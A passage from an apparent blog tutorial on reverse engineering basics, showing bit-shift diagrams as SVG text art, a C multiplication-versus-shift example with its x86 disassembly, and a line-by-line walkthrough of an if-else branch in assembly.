<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='128' y='36' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='128' y='68' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='136' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='152' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='168' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='184' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='200' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='216' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='36' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='36' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='36' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
<p>If we shift it right 4 times we&rsquo;ll get our initial value.</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 288 329"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>B</text>
<text text-anchor='middle' x='0' y='228' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='8' y='228' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='16' y='228' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='24' y='84' fill='currentColor' style='font-size:1em'>V</text>
<text text-anchor='middle' x='24' y='228' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='24' y='260' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='24' y='292' fill='currentColor' style='font-size:1em'>V</text>
<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='32' y='84' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='32' y='228' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='32' y='260' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='32' y='292' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='40' y='84' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='40' y='228' fill='currentColor' style='font-size:1em'>:</text>
<text text-anchor='middle' x='40' y='260' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='40' y='292' fill='currentColor' style='font-size:1em'>l</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>:</text>
<text text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='48' y='84' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='48' y='260' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='48' y='292' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='56' y='84' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='56' y='260' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='56' y='292' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='72' y='52' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='84' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='260' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='72' y='292' fill='currentColor' style='font-size:1em'>=</text>
<text text-anchor='middle' x='80' y='52' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='80' y='84' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='80' y='260' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='80' y='292' fill='currentColor' style='font-size:1em'>&gt;</text>
<text text-anchor='middle' x='136' y='68' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='136' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='100' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='136' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='136' y='276' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='136' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='136' y='308' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='144' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='260' fill='currentColor' style='font-size:1em'>7</text>
<text text-anchor='middle' x='144' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='144' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='144' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='152' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='152' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='152' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='152' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='160' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='260' fill='currentColor' style='font-size:1em'>6</text>
<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='160' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='160' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='168' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='168' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='168' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='168' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='176' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='260' fill='currentColor' style='font-size:1em'>5</text>
<text text-anchor='middle' x='176' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='176' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='176' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='184' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='184' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='184' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='184' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='192' y='52' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='192' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='84' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='192' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='260' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='192' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='192' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='200' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='200' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='200' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='200' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='208' y='52' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='208' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='148' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='208' y='260' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='208' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='208' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='216' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='216' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='216' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='216' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='224' y='52' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='148' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='260' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='232' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='240' y='52' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='148' fill='currentColor' style='font-size:1em'>3</text>
<text text-anchor='middle' x='240' y='260' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='68' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='248' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='100' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='248' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='276' fill='currentColor' style='font-size:1em'>┬</text>
<text text-anchor='middle' x='248' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='248' y='308' fill='currentColor' style='font-size:1em'>┴</text>
<text text-anchor='middle' x='256' y='52' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='68' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='84' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='100' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='148' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='256' y='260' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='292' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='68' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='264' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='100' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='276' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='264' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>►</text>
</g>

    </svg>
  
</div>
<p>Consider this: if we conducted a shift right operation with this, the entire frame would be filled with 0s, and the resultant value would be zero. No matter how many shifts we make.</p>
<p>Another intriguing thing is that you can multiply a number by <code>2</code> using the shift left procedure&hellip;without actually using the <code>*</code> operation.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">void main() {
</span></span><span class="line"><span class="cl">    int a = 589;
</span></span><span class="line"><span class="cl">    int X = a*2;
</span></span><span class="line"><span class="cl">    int Y = a &lt;&lt; 1;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">main:
</span></span><span class="line"><span class="cl">        push    rbp
</span></span><span class="line"><span class="cl">        mov     rbp, rsp
</span></span><span class="line"><span class="cl">        mov     DWORD PTR [rbp-4], 589
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        ; int X = a*2;
</span></span><span class="line"><span class="cl">        mov     eax, DWORD PTR [rbp-4]
</span></span><span class="line"><span class="cl">        add     eax, eax
</span></span><span class="line"><span class="cl">        mov     DWORD PTR [rbp-8], eax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        ; int Y = a &lt;&lt; 1;
</span></span><span class="line"><span class="cl">        mov     eax, DWORD PTR [rbp-4]
</span></span><span class="line"><span class="cl">        add     eax, eax
</span></span><span class="line"><span class="cl">        mov     DWORD PTR [rbp-12], eax
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        nop
</span></span><span class="line"><span class="cl">        pop     rbp
</span></span><span class="line"><span class="cl">        ret
</span></span></code></pre></div><p>At a lower level, they are identical. Nothing particularly useful, but it&rsquo;s good to know what&rsquo;s happening behind the scenes.</p>
<h2 id="branching">Branching</h2>
<p>Now comes the branching. Every good program employs branching for one reason or another. This is very useful to understand when considering reverse engineering.</p>
<h3 id="if-else">If-else</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">a</span><span class="o">==</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="n">x</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Disassembly:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">main:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">push</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rsp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cmp</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-4</span><span class="p">],</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jne</span>     <span class="no">.L2</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl">        <span class="nf">jmp</span>     <span class="no">.L4</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L2:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">mov</span>     <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-8</span><span class="p">],</span> <span class="mi">5</span>
</span></span><span class="line"><span class="cl"><span class="nl">.L4:</span>
</span></span><span class="line"><span class="cl">        <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pop</span>     <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ret</span>
</span></span></code></pre></div><p>Let&rsquo;s understand this step by step</p>
<table>
<thead>
<tr>
<th>Line</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Line 1</td>
<td>label for the function starting</td>
</tr>
<tr>
<td>Line 2:3</td>
<td>Prologue; Setting up the function frame</td>
</tr>
<tr>
<td>Line 4</td>
<td>int a = 1;</td>
</tr>
<tr>
<td>Line 5</td>
<td>Comparing this value with a hardcoded value <code>2</code></td>
</tr>
<tr>
<td>Line 6</td>
<td>If the result of the comparision is <em>not equal</em>, then jump to <code>L2</code> flag</td>
</tr>
<tr>
<td>Line 7</td>
<td>x = 10; This will run if it didn&rsquo;t jump to <code>L2</code></td>
</tr>
<tr>
<td>Line 8</td>
<td>Now jump to <code>L4</code></td>
</tr>
<tr>
<td>Line 9</td>
<td>Flag for <code>L2</code></td>
</tr>
<tr>
<td>Line 10</td>
<td>x = 5;</td>
</tr>
<tr>
<td>Line 11:14</td>
<td>epilogue for the function</td>
</tr>
</tbody>
</table>
<p>Here is a graph to make it more simpler</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 640 553"
      >
      <g transform='translate(8,16)'>
<polygon points='136.000000,352.000000 124.000000,346.399994 124.000000,357.600006' fill='currentColor' transform='rotate(90.000000, 128.000000, 352.000000)'></polygon>
<polygon points='408.000000,352.000000 396.000000,346.399994 396.000000,357.600006' fill='currentColor' transform='rotate(90.000000, 400.000000, 352.000000)'></polygon>
<text text-anchor='middle' x='64' y='276' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='64' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='64' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='64' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='64' y='340' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='72' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='72' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='80' y='292' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='80' y='324' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='80' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='88' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='88' y='324' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='88' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='96' y='292' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='96' y='324' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='96' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='104' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='244' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='112' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='112' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='112' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='112' y='324' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='112' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='120' y='276' fill='currentColor' style='font-size:1em'>─</text>
